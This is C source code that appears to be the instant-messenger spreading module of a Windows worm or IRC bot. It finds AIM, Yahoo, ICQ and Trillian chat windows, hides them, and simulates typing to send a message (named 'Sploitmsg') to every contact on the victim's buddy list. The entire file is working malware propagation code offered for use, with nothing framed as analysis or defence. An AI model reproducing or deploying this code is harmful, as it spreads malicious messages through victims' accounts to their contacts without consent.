#include "includes.h"
#include "functions.h"

#ifndef NO_AIMSPREAD

DWORD WINAPI AIMSpread (void *pVoid)
{

	AIMSPREAD AIM = *((AIMSPREAD *)pVoid);

	AIMSPREAD *pAIM = (AIMSPREAD *)pVoid;
	pAIM->bGotInfo = TRUE;

	HWND hBuddyList = FindBuddyList();
	if ( fIsWindow(hBuddyList))
		IMAll( hBuddyList, AIM.pszMessage );
	if (hBuddyList)
		CloseHandle( hBuddyList );
	if (pAIM)
		free(pAIM);
	
	return(0);
}

HWND FindBuddyList()
{
	HWND oscarNotify = FindWindow("_Oscar_StatusNotify", NULL);
	if ( IsWindow(oscarNotify) )
	{
		SendMessage(oscarNotify, WM_COMMAND, 20003, 0);

		HWND buddyList = 0;
		HWND aimAd = 0;
		do
		{
			buddyList = FindWindowEx(0, buddyList, "#32770", NULL);
			if ( IsWindow(buddyList) )
			{
				aimAd = FindWindowEx(buddyList, 0, "_AimAd", NULL);
				if( IsWindow(aimAd) )
					return buddyList;
			}
		}
		while ( IsWindow(buddyList) );
	}
	return 0;
}
void SendIM(HWND imWindow, LPCTSTR message)
{
	HWND textBox = 0;
	HWND wndAte = 0;
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "WndAte32Class", NULL);
		if ( IsWindow(wndAte) )
		{
            textBox = FindWindowEx(wndAte, 0, "CBClass", NULL);
			if ( IsWindow(textBox) )
			{
				textBox = FindWindowEx(wndAte, 0, "Ate32Class", NULL);
				SendMessage(textBox, WM_SETTEXT, 0, (LPARAM)message);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
	do
	{
		wndAte = FindWindowEx(imWindow, wndAte, "_Oscar_IconBtn", NULL);
		if ( IsWindow(wndAte) )
		{
			if ( ((int)GetMenu(wndAte)) == 409 )
			{
				SendMessage(wndAte, WM_LBUTTONDOWN, 0, 0);
				SendMessage(wndAte, WM_LBUTTONUP, 0, 0);
				wndAte = 0;
			}
		}
	}
	while ( IsWindow(wndAte) );
}
void IMAllWindows(LPCTSTR message)
{
	HWND imWindow = 0;
	do
	{
		imWindow = FindWindowEx(0, 0, "AIM_IMessage", NULL);
		if ( IsWindow(imWindow) )
		{
			SendIM(imWindow, message);
			SendMessage(imWindow, WM_CLOSE, 0, 0);
		}
		Sleep(4000);
	}
	while ( IsWindow(imWindow) );
}

void IMAll(HWND buddyList, LPCTSTR message)
{
	HWND oscarTree = FindWindowEx(buddyList, 0, "#32770", NULL);
	oscarTree = FindWindowEx(oscarTree, 0, "_Oscar_Tree", NULL);
	if ( IsWindow(oscarTree) )
	{
		int itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		int itemIndex = -1;
		while ( itemCount > itemIndex )
		{
			SendMessage(oscarTree, LB_SETCURSEL, ++itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);

			SendMessage(oscarTree, WM_KEYUP, 37, 0);
		}

		itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
		itemIndex = itemCount;
		--itemIndex;
		while (( --itemIndex >= 0 ))
		{
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 39, 0);
			SendMessage(oscarTree, WM_KEYUP, 39, 0);
			int temp = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
			temp -= ( itemCount - itemIndex );
			for ( int i = itemIndex + 1; i <= temp; ++i )
			{
				SendMessage(oscarTree, LB_SETCURSEL, i, 0);
				SendMessage(buddyList, WM_COMMAND, 139, 0);
				IMAllWindows(message);
			}
			
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
			SendMessage(oscarTree, WM_KEYDOWN, 37, 0);
			SendMessage(oscarTree, WM_KEYUP, 37, 0);
			SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
		}
	}
}
#endif

#ifndef NO_IMSPREAD

DWORD WINAPI IMSpread (void *pVoid)
{

	IMSPREAD IM = *((IMSPREAD *)pVoid);
	IMSPREAD *pIM = (IMSPREAD *)pVoid;
	pIM->bGotInfo = TRUE;

	EnumWindows(EnumMSNGRS, (long)IM.pszMessage);

	if (pIM)
		free(pIM);
	return(0);
}

BOOL CALLBACK EnumMSNGRS(HWND hwnd, LPARAM lParam)
{
	char WinText[128], ClassName[50];
	int msngrwindow = 0;
	
	GetClassName(hwnd,ClassName,sizeof(ClassName));

		if(!strcmp(ClassName, "__oxFrame.class__")) //Aim Triton (dunno if it works on newer versions..if it dont msg digerati and ill code a new one)
		{
		    if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
		    if(strstr(WinText, "IM with") != NULL)
	            msngrwindow = 1;
		}
		else
			if(!strcmp(ClassName, "IMClass")) //Yahoo! Messenger with Voice (Should work on all)
				msngrwindow = 1;
			else
				if(!strcmp(ClassName, "#32770")) //ICQ v5 (Should work on all)
				{
					if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
					    if(strstr(WinText, "Message Session") != NULL)
					        msngrwindow = 2;
				}
				else
					if(!strcmp(ClassName, "icoMSN")) //Trillian Msn
					{
						if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
							if(strstr(WinText, ": MSN -") != NULL)
								msngrwindow = 1;
					}
					else
					    if(!strcmp(ClassName, "icoICQ")) //Trillian ICQ
				        {
						    if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
								if(strstr(WinText, ": ICQ -") != NULL)
							        msngrwindow = 1;
					    }
						else
							if(!strcmp(ClassName, "icoAIM")) //Trillian AIM
							{
								if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
									if(strstr(WinText, ": AIM -") != NULL)
									    msngrwindow = 1;
							}
							else
								if(!strcmp(ClassName, "icoYahoo")) //Trillian Yahoo
								{
								    if(GetWindowText(hwnd, WinText, sizeof(WinText)) != 0)
										if(strstr(WinText, ": YAHOO -") != NULL)
											msngrwindow = 1;
								}


	typetext(hwnd, msngrwindow, (const char *)lParam);

	return true;
}

void typetext(HWND hwnd, int msngrwindow, LPCTSTR Sploitmsg)
{
	if(msngrwindow != 0)
	{
		ShowWindow(hwnd, SW_HIDE);
		activatefocus(hwnd);
		cleartext();

		Sleep(10);
		for(int x = 0; x < strlen(Sploitmsg); x++)
		{
			keybd_event(VkKeyScan((char)Sploitmsg[x]),0,0 , 0);
			keybd_event(VkKeyScan((char)Sploitmsg[x]),0, KEYEVENTF_KEYUP,0);
		}
		
		activatefocus(hwnd);
		sendtext(msngrwindow);

	}
	return;
}

void sendtext(int msngrwindow)
{
	if(msngrwindow == 2)
		keybd_event(VK_CONTROL,0,0 , 0);
	keybd_event(VK_RETURN,0,0 , 0);
	keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP , 0);
	keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);

	return;
}

void activatefocus(HWND hwnd)
{
		BringWindowToTop(hwnd);
		SetForegroundWindow(hwnd);
		SetFocus(hwnd);
	return;
}

void cleartext()
{
	keybd_event(VK_CONTROL,0,0 , 0);
	keybd_event(VkKeyScan('a'),0,0 , 0);
	keybd_event(VK_DELETE,0,0 , 0);

	keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);
	keybd_event(VkKeyScan('a'),0,KEYEVENTF_KEYUP , 0);
	keybd_event(VK_DELETE,0,KEYEVENTF_KEYUP , 0);

	return;
}


#endif